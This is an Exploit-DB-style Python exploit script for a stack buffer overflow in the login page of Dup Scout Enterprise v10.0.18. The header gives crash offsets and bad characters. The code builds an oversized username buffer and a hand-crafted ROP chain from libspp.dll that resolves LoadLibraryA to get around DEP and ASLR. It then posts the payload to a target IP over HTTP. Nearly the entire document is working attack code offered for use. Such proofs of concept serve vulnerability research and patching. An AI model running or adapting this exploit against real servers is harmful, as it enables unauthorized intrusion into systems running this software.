"""
Exploit title:      Dup Scout Enterprise v.10.0.18 - Login Page Stack Buffer Overflow (SEH,DEP,ASLR bypass)
Exploit Author:     Paolo Stagno aka VoidSec - voidsec@voidsec.com - https://voidsec.com
Date:               30/06/2020
Vendor Homepage:    https://www.dupscout.com
Download:           https://www.exploit-db.com/apps/84dcc5fe242ca235b67ad22215fce6a8-dupscoutent_setup_v10.0.18.exe
Affected Version:   <= v.10.0.18
CVE:                N/A
Tested on:          Windows 10 Pro x64 v.1909 Build 18363.418
Category:           remote exploits
Platform:           windows
Usage:              Dup_Scout_Enterprise_v.10.0.18.py TARGET_IP 80
Comments:           Application is vulnerable in both login fields
    username:       EIP contains normal pattern : 0x42306142 (offset 780) - ESP (0x01fd744c) points at offset 788 in normal pattern (length 3299)
    password:       EIP contains normal pattern : 0x72413372 (offset 520) - ESP (0x01e8744c) points at offset 528 in normal pattern (length 3559)

"""


import socket, struct, argparse

parser = argparse.ArgumentParser(prog="Dup_Scout_Enterprise_v.10.0.18.py", description="Dup Scout Enterprise <= v.10.0.18 RCE exploit")
parser.add_argument("-t", "--target", required=True, dest="target", help="Target IP Address")
parser.add_argument("-p", "--port", default=80, type=int, dest="port", help="Target TCP Port")
args = parser.parse_args() 

host = args.target
port = args.port

# |                                                     buffer (10144)                                                   |
# | filler until EIP is hit (780) | EIP (4) | filler (4) | filler (4) | ROP () | shellcode () | filler until max_size () |
#                                                                       ^- data pointed by ESP

buf_max_size = 10144
eip_offset = 780

buf = ""
buf += "A" * eip_offset
buf += struct.pack("<I", 0x10128eb9) # EIP 0x10128eb9 : pop esi # pop edi # ret  |  {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files (x86)\Dup Scout Enterprise\bin\libspp.dll)
buf += "CCCC" # filler to compensate ESP location
buf += "CCCC" # filler to compensate pop edi
buf += "CCCC" # filler to compensate pop edi
# BAD CHARS: \x00\x0a\x0d\x25\x26\x2b\x3d
# \x2b -> 20
# !mona compare -f "C:\\logs\\dupscts\\bytearray.bin" -a ESP

def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
        # Retreieve loadlibrarya from IAT
        0x1012b413, # POP EAX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x101681d0, # Pointer to libpal: At 0x101681d0 in libspp (base + 0x001681d0) : 0x00a7db10 (ptr to libpal.sca_getreportfunction)
        0x1014dc4c, # MOV EAX,DWORD PTR DS:[EAX] # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x100cb4d4, # XCHG EAX,EDX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x10161002, # POP ECX # RETN    ** [libspp.dll] **   |  ascii {PAGE_EXECUTE_READ}
        0xfff8e93c, # Pointer to loadlibrarya: At 0x00aef1d4 in libpal (base + 0x0008f1d4) : 0x77662990 (ptr to KERNEL32.loadlibrarya); offset=0x00aef1d4-0x00a7db10=0x000716c4; has nullbytes, was negated 0xfff8e93c
        0x100baecb, # XCHG EAX,ECX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x100c1586, # NEG EAX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x100cb4d4, # XCHG EAX,EDX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x1003f9f9, # ADD EAX,EDX # RETN 0x04    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x1014dc4c, # MOV EAX,DWORD PTR DS:[EAX] # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        # EAX = KERNEL32.LoadLibraryA
        0x41414141, # Compensate RETN 0x04
        0x100baecb, # XCHG EAX,ECX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        # ECX = KERNEL32.LoadLibraryA
        ###########################
        # SAVE ESP
        0x1015410c, # INC ECX # ADC EAX,8D24FF10 # PUSH ESP # INC ECX # ADC EAX,8468B10 # POP ESI # RETN    ** [libspp.dll] **   |  ascii {PAGE_EXECUTE_READ}        
        # ----> ESP <----
        0x10156230, # MOV EAX,EBX # POP EBP # POP EBX # ADD ESP,30 # RETN    ** [libspp.dll] **   |  ascii {PAGE_EXECUTE_READ}
        # ESP + 48
        0x90909090, # compensate pop EBP
        0x90909090, # compensate pop EBX
        ###########################
        # FUNCTION BLOCK START
        ###########################
        0x41414141, # will become KERNEL32.LoadLibraryA (parameter placeholder)
        0x42424242, # will become the return address (parameter placeholder)
        0x43434343, # will become lpLibFileName (parameter placeholder)
        #  k  e  r  n |  e  l  3  2 |  .  d  l  l
        # 6b 65 72 6e | 65 6c 33 32 | 2e 64 6c 6c
        0x6e72656b,
        0x32336c65,
        0x6c6c642e,
        0x43434343, # place holder for 00 (null terminator)
        0x90909090, # compensate esp + 48
        0x90909090, # compensate esp + 48
        0x90909090, # compensate esp + 48
        0x90909090, # compensate esp + 48
        0x90909090, # compensate esp + 48
        ###########################
        # FUNCTION BLOCK END 
        ###########################
        # ESP <- should now point here
        # ESI = old ESP
        0x100fcd73, # DEC ECX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x100fcd73, # DEC ECX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}      
        0x10137e98, # MOV EAX,ESI # POP ESI # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x90909090, # Compensate POP ESI
        # EAX = old ESP
        # Makes EAX holds location of KERNEL32.LoadLibraryA placeholder
        0x10154818, # POP EBP # RETN    ** [libspp.dll] **   |  ascii {PAGE_EXECUTE_READ}
        0xfffffff4, # h10 = 12 (# bytes after old ESP)
        0x1014426e, # XCHG EAX,EBP # RETN    ** [libspp.dll] **   |  ascii {PAGE_EXECUTE_READ}
        0x100c1586, # NEG EAX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x100fcd71, # ADD EAX,EBP # DEC ECX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x1010adf1, # INC ECX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        # EAX = -> KERNEL32.LoadLibraryA placeholder
        # ECX = *KERNEL32.LoadLibraryA
        # EDX = garbage
        0x100cb4d4, # XCHG EAX,EDX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x100baecb, # XCHG EAX,ECX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        # EAX = *KERNEL32.LoadLibraryA
        # EDX = -> KERNEL32.LoadLibraryA placeholder
        # Create *KERNEL32.LoadLibraryA
        0x1012d24e, # MOV DWORD PTR DS:[EDX],EAX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        # Create the return addr
        0x1013fc4f, # MOV EAX,EDX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x100baecb, # XCHG EAX,ECX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ
        0x1013fc4f, # MOV EAX,EDX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x10023688, # INC EAX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x10023688, # INC EAX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x10023688, # INC EAX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x10023688, # INC EAX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x100baecb, # XCHG EAX,ECX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ
        # EAX = -> *KERNEL32.LoadLibraryA placeholder
        # EDX = -> *KERNEL32.LoadLibraryA placeholder
        # ECX = -> return address placeholder
        0x1015410c, # INC ECX # ADC EAX,8D24FF10 # PUSH ESP # INC ECX # ADC EAX,8468B10 # POP ESI # RETN    ** [libspp.dll] **   |  ascii {PAGE_EXECUTE_READ}
        0x100fcd73, # DEC ECX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}      
        0x100fcd73, # DEC ECX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}           
        # ESP <- should now point here
        0x10137e98, # MOV EAX,ESI # POP ESI # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x90909090, # Compensate POP ESI
        # EAX = old ESP
        0x10154818, # POP EBP # RETN    ** [libspp.dll] **   |  ascii {PAGE_EXECUTE_READ}
        0xffffff28, # d8 = 216 (# bytes after old ESP)
        0x1014426e, # XCHG EAX,EBP # RETN    ** [libspp.dll] **   |  ascii {PAGE_EXECUTE_READ}
        0x100c1586, # NEG EAX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x100fcd71, # ADD EAX,EBP # DEC ECX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x1010adf1, # INC ECX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x100baecb, # XCHG EAX,ECX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ
        0x100cb4d4, # XCHG EAX,EDX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x100baecb, # XCHG EAX,ECX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ
        0x1012d24e, # MOV DWORD PTR DS:[EDX],EAX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        # EAX = address of return function
        # EDX = -> return address placeholder
        # ECX = -> *KERNEL32.LoadLibraryA placeholder
        # EBP = old esp value
        # Create lpLibFileName
        0x1013fc4f, # MOV EAX,EDX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        # EAX = -> return address placeholder
        # EDX = -> return address placeholder
        0x10023688, # INC EAX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x10023688, # INC EAX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x10023688, # INC EAX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x10023688, # INC EAX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        # EAX = -> lpLibFileName
        0x100baecb, # XCHG EAX,ECX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x1013fc4f, # MOV EAX,EDX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        # ECX = -> lpLibFileName
        0x10023688, # INC EAX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x10023688, # INC EAX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x10023688, # INC EAX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x10023688, # INC EAX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x10023688, # INC EAX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x10023688, # INC EAX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x10023688, # INC EAX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x10023688, # INC EAX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        # EAX = -> *kernel32.dll
        # ECX = -> lpLibFileName
        # EDX = -> return address placeholder
        0x100cb4d4, # XCHG EAX,EDX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x100baecb, # XCHG EAX,ECX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x100cb4d4, # XCHG EAX,EDX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x1012d24e, # MOV DWORD PTR DS:[EDX],EAX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        # Create null terminator
        0x10023688, # INC EAX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x10023688, # INC EAX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x10023688, # INC EAX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x10023688, # INC EAX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x10023688, # INC EAX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x10023688, # INC EAX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x10023688, # INC EAX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x10023688, # INC EAX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x10023688, # INC EAX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x10023688, # INC EAX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x10023688, # INC EAX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x10023688, # INC EAX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x100cb4d4, # XCHG EAX,EDX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x10154e78, # XOR EAX,EAX # RETN    ** [libspp.dll] **   |  ascii {PAGE_EXECUTE_READ}  
        0x1012d24e, # MOV DWORD PTR DS:[EDX],EAX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        # Call LoadLibraryA
        0x100fcd73, # DEC ECX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x100fcd73, # DEC ECX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x100fcd73, # DEC ECX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x100fcd73, # DEC ECX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x100baecb, # XCHG EAX,ECX # RETN    ** [libspp.dll] **   |   {PAGE_EXECUTE_READ}
        0x10144265, # XCHG EAX,ESP # RETN    ** [libspp.dll] **   |  ascii {PAGE_EXECUTE_READ}
        # LoadLibraryA will return here
        0x90909090,
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

buf += create_rop_chain()
buf += "D" * (buf_max_size-len(buf))

print("[-] Connecting to {}:{}".format(host, port))

req = ("POST /login HTTP/1.0\r\n"
"Content-Type: application/x-www-form-urlencoded\r\n"
"Content-Length: {}\r\n"
"\r\n"
"username={}&password=pswd".format(len(buf),buf))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

print("[-] Sending {} bytes".format(len(buf)))

s.send(req)
data = s.recv(1024)
s.close()